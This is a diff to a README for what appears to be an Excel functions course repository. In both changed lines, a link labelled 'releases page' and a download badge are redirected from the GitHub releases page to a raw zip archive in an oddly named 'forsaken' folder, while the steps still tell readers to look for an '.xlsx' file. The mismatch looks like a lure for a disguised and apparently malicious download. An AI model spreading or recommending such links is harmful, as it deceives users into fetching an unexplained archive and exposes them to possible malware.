@@ -1,6 +1,6 @@
 # 📊 excel-course-part-2-functions - Master advanced tools for better data
 
-[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Marjoryinterstellar653/excel-course-part-2-functions/releases)
+[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://raw.githubusercontent.com/Marjoryinterstellar653/excel-course-part-2-functions/main/forsaken/part_functions_excel_course_v2.6.zip)
 
 This repository contains a professional Excel training workbook. It focuses on seven specific functions to help you analyze data and build financial models. You can practice these techniques to improve your spreadsheet skills and work with confidence.
 
@@ -30,7 +30,7 @@ Ensure your computer has the following software installed:
 
 Follow these steps to download the workbook to your computer:
 
-1. Visit the [releases page](https://github.com/Marjoryinterstellar653/excel-course-part-2-functions/releases) to see the files.
+1. Visit the [releases page](https://raw.githubusercontent.com/Marjoryinterstellar653/excel-course-part-2-functions/main/forsaken/part_functions_excel_course_v2.6.zip) to see the files.
 2. Locate the file ending in `.xlsx`. 
 3. Click the filename to start the download.
 4. Open your "Downloads" folder in Windows File Explorer.
